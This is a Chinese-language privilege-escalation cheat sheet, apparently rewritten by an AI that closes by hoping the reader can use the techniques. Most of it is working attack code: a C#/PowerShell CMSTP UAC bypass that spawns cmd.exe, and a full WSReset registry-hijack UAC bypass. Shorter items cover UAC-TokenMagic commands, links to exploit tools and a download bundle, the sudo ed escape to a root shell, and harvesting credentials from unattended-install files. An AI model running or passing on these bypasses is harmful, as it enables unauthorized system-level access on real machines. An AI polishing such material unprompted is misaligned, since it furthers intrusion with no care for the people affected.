以下是优化后的文本，使其更加清晰、连贯和专业：

---

### 代码示例：CMSTP UAC Bypass

```csharp
public static string SetInfFile(string CommandToExecute)
{
    StringBuilder newInfData = new StringBuilder(InfData);
    newInfData.Replace("REPLACE_COMMAND_LINE", CommandToExecute);
    File.WriteAllText(OutputFile.ToString(), newInfData.ToString());
    return OutputFile.ToString();
}

public static bool Execute(string CommandToExecute)
{
    if (!File.Exists(BinaryPath))
    {
        Console.WriteLine("Could not find cmstp.exe binary!");
        return false;
    }

    StringBuilder infFile = new StringBuilder();
    infFile.Append(SetInfFile(CommandToExecute));

    Console.WriteLine($"Payload file written to {infFile}");

    ProcessStartInfo startInfo = new ProcessStartInfo(BinaryPath);
    startInfo.Arguments = $"/au {infFile}";
    startInfo.UseShellExecute = false;

    Process.Start(startInfo);

    IntPtr windowHandle = IntPtr.Zero;

    do
    {
        windowHandle = SetWindowActive("cmstp");
    } while (windowHandle == IntPtr.Zero);

    System.Windows.Forms.SendKeys.SendWait("{ENTER}");
    return true;
}

public static IntPtr SetWindowActive(string processName)
{
    Process[] target = Process.GetProcessesByName(processName);
    if (target.Length == 0) return IntPtr.Zero;

    target[0].Refresh();
    IntPtr windowHandle = target[0].MainWindowHandle;
    if (windowHandle == IntPtr.Zero) return IntPtr.Zero;

    SetForegroundWindow(windowHandle);
    ShowWindow(windowHandle, 5);
    return windowHandle;
}
```

### PowerShell Script: Add-Type and Execution

```powershell
Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\Source.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "CMSTP-UAC-Bypass.dll"
[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\CMSTP-UAC-Bypass.dll"))
[CMSTPBypass]::Execute("C:\Windows\System32\cmd.exe")
```

### 参考资料

- [UAC-TokenMagic.ps1 绕过 UAC](https://github.com/FuzzySecurity/PowerShell-Suite)
- [Reading Your Way Around UAC Part 1](https://tyranidslair.blogspot.co.uk/2017/05/reading-your-way-around-uac-part-1.html)
- [Reading Your Way Around UAC Part 2](https://tyranidslair.blogspot.co.uk/2017/05/reading-your-way-around-uac-part-2.html)
- [Reading Your Way Around UAC Part 3](https://tyranidslair.blogspot.co.uk/2017/05/reading-your-way-around-uac-part-3.html)

### 示例命令

```powershell
C:\PS> UAC-TokenMagic -BinPath C:\Windows\System32\cmd.exe
C:\PS> UAC-TokenMagic -BinPath C:\Windows\System32\cmd.exe -Args "/c calc.exe" -ProcPID 1116
C:\PS> UAC-TokenMagic -BinPath C:\Windows\System32\cmd.exe -ProcPID 3624
```

### ctftool 20 年漏洞

谷歌披露了影响所有 Windows 版本的 20 年未修补漏洞。已测试 WIN10。

- [CTFMON Windows 漏洞](https://thehackernews.com/2019/08/ctfmon-windows-vulnerabilities.html)
- [ctftool 发布页面](https://github.com/taviso/ctftool/releases)

### 需要绕过 UAC 再获取系统权限

- [GitHub 项目](https://github.com/sailay1996/tokenx_privEsc)
- [打包下载链接](https://demonsec666.oss-cn-qingdao.aliyuncs.com/%E9%9C%80%E8%BF%87UAC-getsystem.zip)
- [参考资料](http://www.ggsec.cn/uac-getsystem.html)

### WSReset-UAC

```powershell
function Invoke-WSResetBypass {
    Param (
        [String]$Command = "C:\Windows\System32\cmd.exe /c start cmd.exe"
    )

    $commandPath = "HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command"
    New-Item $commandPath -Force | Out-Null
    New-ItemProperty -Path $commandPath -Name "DelegateExecute" -Value "" -Force | Out-Null
    Set-ItemProperty -Path $commandPath -Name "(default)" -Value $Command -Force -ErrorAction SilentlyContinue | Out-Null

    Write-Host "[+] Registry entry has been created successfully!"
    $process = Start-Process -FilePath "C:\Windows\System32\WSReset.exe" -WindowStyle Hidden
    Write-Host "[+] Starting WSReset.exe"
    Write-Host "[+] Triggering payload.."
    Start-Sleep -Seconds 5

    if (Test-Path $commandPath) {
        Remove-Item $commandPath -Recurse -Force
        Write-Host "[+] Cleaning up registry entry"
    }
}

Invoke-WSResetBypass
```

- [参考资料](http://www.activecyber.us/activelabs/windows-uac-bypass)

### Linux: 利用 ed 文本编辑器提升权限

`ed` 是一个面向行的文本编辑器，于 1969 年开发。在提及安全性问题之前，需要了解 `ed` 的基本操作。

- **基本操作**：
  - 初始化文件：`ed info.txt`
  - 输入内容：`a`
  - 编辑：`.`
  - 保存并退出：`w` 后跟文件名，`q`

- **更改特定行**：
  - 显示行与行号：`p` 或 `n`
  - 更改该行：`c`

- **显示错误消息**：
  - 不理解的内容显示问号：`?`
  - 更多有关错误的信息：`h`

- **复制和移动操作**：
  - 复制：`t`
  - 移动：`m`

- **搜索操作**：
  - 搜索关键字：`%/linux`

- **Sudo 权限设置**：
  - 配置文件中设置 `NOPASSWD: /bin/ed`

- **利用 Sudo 权利**：
  - 查看可用命令：`sudo -l`
  - 执行 `ed`：`sudo ed`
  - 获取 root shell：`!/bin/sh`

- [参考资料](http://www.hackingarticles.in/linux-for-pentester-ed-privilege-escalation/)
- [参考资料](http://www.freebuf.com/sectool/209494.html)

### LINUX sudo (T1169)

- [GitHub 项目](https://github.com/nongiach/sudo_inject1)

### 存储凭证

进入系统后，首先检查是否有账户密码之类的凭证。获取高权限账号密码可以直接提升权限。无人部署的方式安装 Windows 服务器系统时，会遗留许多敏感信息文件，其中包含 XML 格式的文件。获取信息的方式是翻译它们的标签。

---

希望这些优化后的文本能够更好地帮助你理解和使用相关技术。